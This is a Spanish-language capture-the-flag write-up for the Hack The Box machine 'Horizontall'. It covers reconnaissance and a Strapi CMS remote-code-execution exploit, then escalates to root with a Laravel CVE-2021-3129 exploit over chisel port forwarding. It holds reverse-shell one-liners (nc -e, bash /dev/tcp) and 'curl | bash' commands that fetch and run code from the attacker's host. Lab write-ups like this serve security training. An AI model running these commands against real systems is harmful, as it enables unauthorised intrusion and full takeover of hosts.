@@ -1,0 +1,432 @@
+<p>Certificaciones a aplicar: eJPT, eWPT</p>
+
+<p>Dificultad: Fácil</p>
+
+<p>Habilidades:</p>
+
+<ul>
+  <li>Information Leakage</li>
+  <li>Port Forwarding</li>
+  <li>Strapi CMS Exploitation</li>
+  <li>Laravel Exploitation</li>
+</ul>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Horizontall.png" alt="Captura de pantalla (62).png" /></p>
+
+<h1 id="ip-de-la-maquina">IP de la Maquina</h1>
+
+<p>10.10.11.105</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+
+<p>Identificando el sistema operativo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whichSystem.py 10.10.11.105
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-17-57-12.png" alt="Hackforce-2022-12-11-17-57-12.png" /></p>
+
+<p>Escaneo de los puertos y guardamos en formato grep en el ficherito allPorts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.105 <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-17-56-15.png" alt="Hackforce-2022-12-11-17-56-15.png" /></p>
+
+<p>Función extractPorts.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extractPorts allPorts
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-00-00.png" alt="Hackforce-2022-12-11-18-00-00.png" /></p>
+
+<h1 id="análisis-de-vulnerabilidades">Análisis de Vulnerabilidades</h1>
+
+<p>Buscando versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito targeted.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.105 <span class="nt">-oN</span> targeted
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-01-23.png" alt="Hackforce-2022-12-11-18-01-23.png" /></p>
+
+<p>Vamos a identificar ante que nos estamos enfrentando de la siguiente manera colocamos en el navegador launchpad 4ubuntu0.5 y nos dara el siguiente resultado.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-07-31.png" alt="Hackforce-2022-12-11-18-07-31.png" /></p>
+
+<p>De esta manera vemos que estamos ante un Ubuntu Bionic.</p>
+
+<p>Luego vemos que nmap nos reporta que hay un follow redirect hacia <a href="http://horizontall.htb/">http://horizontall.htb</a> entonces verificamos con whatweb y debería mostrar lo mismo.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-11-03.png" alt="Hackforce-2022-12-11-18-11-03.png" /></p>
+
+<p>En efecto vemos que nos muestra lo mismo, si colocamos esa dirección en el navegador nos dará error ya que se esta aplicando virtual hosting.</p>
+
+<p>Para agregarla editamos el fichero que esta /etc/hosts de la siguiente manera.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-16-41.png" alt="Hackforce-2022-12-11-18-16-41.png" /></p>
+
+<p>Con esto ya tendria que resolvernos el dominio en la ip privada y para comprobar emitimos un ping hacia el dominio.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-18-08.png" alt="Hackforce-2022-12-11-18-18-08.png" /></p>
+
+<p>Luego vamos a aplicar el script http-enum de nmap al dominio agregado y lo guardamos en formato nmap y lo exportamos en el ficherito webScan.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-23-25.png" alt="Hackforce-2022-12-11-18-23-25.png" /></p>
+
+<p>Si no nos encontro nada como es el caso borramos el ficherito.</p>
+
+<p>Vamos a hacer Fuzzing con wfuzz</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-09-04.png" alt="Hackforce-2022-12-11-23-09-04.png" /></p>
+
+<p>Nos encontró 3 directorios los analizamos y miramos si hay algo si no inspeccionaremos el código fuente de la pagina a ver si hay alguna pista.</p>
+
+<p>Lanzamos un Curl al sitio haciendo una petición GET.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://horizontall.htb/"</span> | htmlq <span class="nt">-p</span> | <span class="nb">cat</span> <span class="nt">-l</span> html
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-19-45.png" alt="Hackforce-2022-12-11-23-19-45.png" /></p>
+
+<p>Nos lo mostrara asi para inspeccionar mejor el código y vemos algo medio intersante haciendo referencia a unos archivos java script.</p>
+
+<p>Vamos a utilizar unas expresiones regulares con grep para filtrar por lo que nos interesa.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://horizontall.htb/"</span> | htmlq <span class="nt">-p</span> | <span class="nb">cat</span> <span class="nt">-l</span> html | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'".*?"'</span> | <span class="nb">grep </span>app<span class="se">\.</span> | <span class="nb">sort</span> <span class="nt">-u</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-30-41.png" alt="Hackforce-2022-12-11-23-30-41.png" /></p>
+
+<p>Observamos dos rutas, la de css no es de tanto interes asi que vamos a mirar la de js.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://horizontall.htb/js/app.c68eb462.js"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-33-15.png" alt="Hackforce-2022-12-11-23-33-15.png" /></p>
+
+<p>Vemos lo siguiente, no miramos nada así que vamos a filtrar para ver si logramos obtener algo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://horizontall.htb/js/app.c68eb462.js"</span> | <span class="nb">grep</span> <span class="s2">"</span><span class="se">\.</span><span class="s2">htb"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-38-34.png" alt="Hackforce-2022-12-11-23-38-34.png" /></p>
+
+<p>Vemos algo interesante así que vamos a crear una expresión regular una vez mas y que nos filtre por http.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://horizontall.htb/js/app.c68eb462.js"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'".*?"'</span> | <span class="nb">grep </span>http |  <span class="nb">sort</span> <span class="nt">-u</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-42-50.png" alt="Hackforce-2022-12-11-23-42-50.png" /></p>
+
+<p>Ahi tenemos lo que nos interesa así que vamos a verlo en el navegador, pero antes tenemos que agregarlo al /etc/hosts.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-45-13.png" alt="Hackforce-2022-12-11-23-45-13.png" /></p>
+
+<p>Ahora lo miramos en el navegador y vemos con wappalyzer que tecnologias posee.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-47-17.png" alt="Hackforce-2022-12-11-23-47-17.png" /></p>
+
+<p>Vemos un CMS llamado strapi.</p>
+
+<p>Buscamos con searchsploit una posible vulnerabilidad.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit  strapi
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-49-24.png" alt="Hackforce-2022-12-11-23-49-24.png" /></p>
+
+<p>Vemos 3 vulnerabilidades encontradas.</p>
+
+<p>Vamos a verlo por consola la url que vimos anteriormente <a href="http://api-prod.horizontall.htb/reviews">http://api-prod.horizontall.htb/reviews</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://api-prod.horizontall.htb/reviews"</span> | jq
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-53-10.png" alt="Hackforce-2022-12-11-23-53-10.png" /></p>
+
+<p>Vemos posibles usuarios pero nada mas así que volveremos a hacer fuzzing con wfuzz.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404,200 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="s2">"http://api-prod.horizontall.htb/FUZZ"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-06-57.png" alt="Hackforce-2022-12-12-00-06-57.png" /></p>
+
+<p>Vemos por ahi un par de cosas interesantes por ejem visitaremos la ruta de admin a ver que hay.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-08-30.png" alt="Hackforce-2022-12-12-00-08-30.png" /></p>
+
+<p>Vemos un panel de autenticacion pero no disponemos de credenciales, antes probamos buscar las de default a ver si logramos entrar.</p>
+
+<p>Ahora haremos Fuzzing de nuevo a esta ruta <a href="http://api-prod.horizontall.htb/admin/">http://api-prod.horizontall.htb/admin/</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>854 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="s2">"http://api-prod.horizontall.htb/admin/FUZZ"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-43-41.png" alt="Hackforce-2022-12-12-00-43-41.png" /></p>
+
+<p>Miramos un par de directorios interesantes.</p>
+
+<p>Al visitar el directorio Init podemos contemplar la version de Strapi y si buscamos con searchsploit como lo hicimos anteriormente miraremos que es vulnerable.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-49-13.png" alt="Hackforce-2022-12-12-00-49-13.png" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit strapi
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-51-06.png" alt="Hackforce-2022-12-12-00-51-06.png" /></p>
+
+<h1 id="explotación">Explotación</h1>
+
+<p>Nos dirigimos a la carpeta exploit de nuestros directorios de trabajo y nos copiamos el que dice remote code execution (Unauthenticated).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-m</span> multiple/webapps/50239.py
+</code></pre></div></div>
+
+<p>Lo renombramos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv </span>50239.py rce_strapi.py
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-57-51.png" alt="Hackforce-2022-12-12-00-57-51.png" /></p>
+
+<p>Ejecutamos el exploit para ver que nos pide.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 rce_strapi.py
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-00-59-28.png" alt="Hackforce-2022-12-12-00-59-28.png" /></p>
+
+<p>Como vemos solo nos pide la url.</p>
+
+<p>Le pasamos la URL.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-03-33.png" alt="Hackforce-2022-12-12-01-03-33.png" /></p>
+
+<p>Y como podemos ver nos funciono el exploit.</p>
+
+<p>Ahora probaremos entablarnos una reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-e</span> /bin/bash 10.10.14.7 443
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-10-06.png" alt="Hackforce-2022-12-12-01-10-06.png" /></p>
+
+<p>Vemos que no al parecer no nos interpreta, hacemos un par de pruebas mas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /de/tcp/10.10.14.7/443 0&gt;&amp;1
+bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /de/tcp/10.10.14.7/443 0&gt;&amp;1"</span>
+bash <span class="nt">-c</span> bash <span class="nt">-i</span> <span class="o">&gt;</span>%26 /de/tcp/10.10.14.7/443 0&gt;%261<span class="s2">"
+</span></code></pre></div></div>
+
+<p>Probamos con cada una y vemos que no funciona entonces verificamos que la maquina tenga curl.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Curl http://10.10.14.7/test
+</code></pre></div></div>
+
+<p>Y también nos montamos el servidor con python en nuestra maquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-16-05.png" alt="Hackforce-2022-12-12-01-16-05.png" /></p>
+
+<p>Y vemos que si tiene curl instalado la maquina victima.</p>
+
+<p>Lo que haremos sera crearnos un archivo index.html con el siguiente contenido.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nvim index.html
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-43-37.png" alt="Hackforce-2022-12-12-01-43-37.png" /></p>
+
+<p>Nos montamos el servidor con python para compartirnos el recurso index.html.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>Ahora hacemos un curl al recurso que compartimos, veremos que nos muestra el código del index.html si lo pipeamos con bash nos va a interpretar el código, antes de lanzarle el curl nos ponemos en escucha con netcat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.14.7/index.html | bash
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-45-04.png" alt="Hackforce-2022-12-12-01-45-04.png" /></p>
+
+<p>Una vez lanzado el curl podemos ver que hemos obtenido una reverse shell.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-49-08.png" alt="Hackforce-2022-12-12-01-49-08.png" /></p>
+
+<p>Hacemos un locate del user.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate user.txt
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-57-41.png" alt="Hackforce-2022-12-12-01-57-41.png" /></p>
+
+<p>Vemos donde esta la flag y hacemos un cat para ver si logramos visualizarla.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/user.png" alt="Hackforce-2022-12-12-01-58-44.png" /></p>
+
+<p>En efecto visualizamos la flag con eso ya tendríamos la maquina ahora nos falta convertirnos en root.</p>
+
+<p>Antes de escalar priveligios haremos el tratamiento de la TTY.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-14-16.png" alt="Hackforce-2022-12-12-02-14-16.png" /></p>
+
+<p>ctrl + z y continuamos con el tratamiento.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg
+</span>reset
+xterm
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-16-30.png" alt="Hackforce-2022-12-12-02-16-30.png" /></p>
+
+<p>Continuamos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+ssty rows 37 columns 183
+</code></pre></div></div>
+
+<p>En el caso de el size de la stty tienen que colocar la de las proporciones de su ventana y ya con esto tendriamos total movilidad en la shell.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-20-33.png" alt="Hackforce-2022-12-12-02-20-33.png" /></p>
+
+<p>Ahora si pasamos a la escalada.</p>
+
+<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
+
+<p>Lo primero que haremos sera buscar por permisos SUID nos dirigimos a la raiz y ejecutamos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-28-37.png" alt="Hackforce-2022-12-12-02-28-37.png" /></p>
+
+<p>No vemos nada interesante para escalar.</p>
+
+<p>Luego listamos por tareas cron.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/crontab
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-29-51.png" alt="Hackforce-2022-12-12-02-29-51.png" /></p>
+
+<p>No vemos ninguna tarea cron.</p>
+
+<p>Listamos puertos que estén abiertos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat <span class="nt">-nat</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-31-39.png" alt="Hackforce-2022-12-12-02-31-39.png" /></p>
+
+<p>Vemos por ahi uno interesante.</p>
+
+<p>lanzamos un curl al puerto 8000 para ver que hay.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl localhost:8000
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-32-56.png" alt="Hackforce-2022-12-12-02-32-56.png" /></p>
+
+<p>Vemos que hay una pagina web con laravel.</p>
+
+<p>Utilizaremos chisel para jugar con port forwarding. Nos dirigimos a github y nos clonamos el repositorio en exploits.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/jpillora/chisel.git
+</code></pre></div></div>
+
+<p>Nos metemos en chisel y compilamos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go build <span class="nt">-ldflags</span> <span class="s2">"-s -w"</span> <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Ahora con UPX vamos a reducir mas el peso de chisel</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upx chisel
+</code></pre></div></div>
+
+<p>Una vez hecho esto nos transferiremos el chisel a la maquina victima. En nuestra maquina colocamos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>Y en la maquina victima nos dirigimos al directorio tmp y nos bajamos el chisel.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.14.7/chisel
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-45-39.png" alt="Hackforce-2022-12-12-02-45-39.png" /></p>
+
+<p>Luego le damos permisos de ejecución chmod + x chisel.</p>
+
+<p>Ahora para utilizar chisel vamos a montarnos un servidor en nuestra maquina por el puerto que queramos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-55-21.png" alt="Hackforce-2022-12-12-02-55-21.png" /></p>
+
+<p>Ahora ejecutamos el chisel en la maquina victima para hacer el port forwarding.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel client 10.10.14.7:1234 R:8000:127.0.0.1:8000
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-04-25.png" alt="Hackforce-2022-12-12-03-04-25.png" /></p>
+
+<p>Con esto ya estaría listo el port forwarding, y lo verificamos visitando el <a href="http://localhost">localhost</a> en el puerto indicado.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-05-39.png" alt="Hackforce-2022-12-12-03-05-39.png" /></p>
+
+<p>Listo ya podemos visualizar la pagina de laravel en nuestra maquina.</p>
+
+<p>Buscamos en github un exploit para esa version de laravel y nos clonamos el repositorio en exploits.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/nth347/CVE-2021-3129_exploit.git
+</code></pre></div></div>
+
+<p>Nos metemos al directorio y ejecutamos el script de python.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 <span class="nb">whoami</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-32-43.png" alt="Hackforce-2022-12-12-03-32-43.png" /></p>
+
+<p>Listo nos funciono ahora solo nos faltaria ejecutarnos una reverse shell para acceder como root y visualizar la flag.</p>
+
+<p>Como ya tenemos una via potencial para mandarnos la reverse shell con el index.html que habiamos creado lo copiamos a este directorio.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> ../index.html <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Luego montamos el servidor con python nuevamente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>Nos ponemos en escucha con netcat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp443</span>
+</code></pre></div></div>
+
+<p>Y por ultimo ejecutamos el exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 <span class="s1">'curl 10.10.14.7 | bash'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-44-27.png" alt="Hackforce-2022-12-12-03-44-27.png" /></p>
+
+<p>Listo con esto nos convertimos en root y podemos visualizar la flag.</p>
+
+<p>Visualizamos la flag.</p>
+
+<p><img src="/assets/images/htb-writeup-horizontall/root.png" alt="Hackforce-2022-12-12-03-49-05.png" /></p>
+
+<p>Listo con esto tendríamos hecha la maquina por completo, happy hacking.</p>
